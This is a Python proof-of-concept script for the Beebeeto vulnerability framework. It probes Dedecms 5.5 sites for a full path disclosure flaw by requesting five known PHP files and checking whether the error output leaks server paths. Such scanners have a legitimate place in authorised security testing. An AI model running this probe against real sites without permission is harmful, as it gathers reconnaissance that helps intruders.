#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0084',
            'name': 'Dedecms v5.5 full Path Disclosure Vulnerability POC',
            'author': '小马甲',
            'create_date': '2014-10-19',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Dedecms',
            'vul_version': ['5.5'],
            'type': 'Information Disclosure',
            'tag': ['Dedecms信息泄露', 'Dedecms爆路径', '5.5路径泄露'],
            'desc': 'N/A',
            'references': ['http://www.myhack58.com/Article/html/3/62/2010/26804.htm',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        file_list =  ['/plus/paycenter/alipay/return_url.php',
                      '/plus/paycenter/cbpayment/autoreceive.php',
                      '/plus/paycenter/nps/config_pay_nps.php',
                      '/plus/task/dede-maketimehtml.php',
                      '/plus/task/dede-optimize-table.php',]
        args['poc_ret']['file_path'] = []
        for filename in file_list:
            verify_url = args['options']['target'] + filename
            try:
                if args['options']['verbose']:
                    print '[*] Requst URL: ' + verify_url
                req = urllib2.urlopen(verify_url)
                content = req.read()
            except:
                continue
            if '<b>Fatal error</b>:' in content and '.php</b>' in content:
                if 'on line <b>'  in content:
                    args['success'] = True
                    args['poc_ret']['file_path'].append(verify_url)
        if not args['poc_ret']['file_path']:
            args['poc_ret'].pop('file_path')
            args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())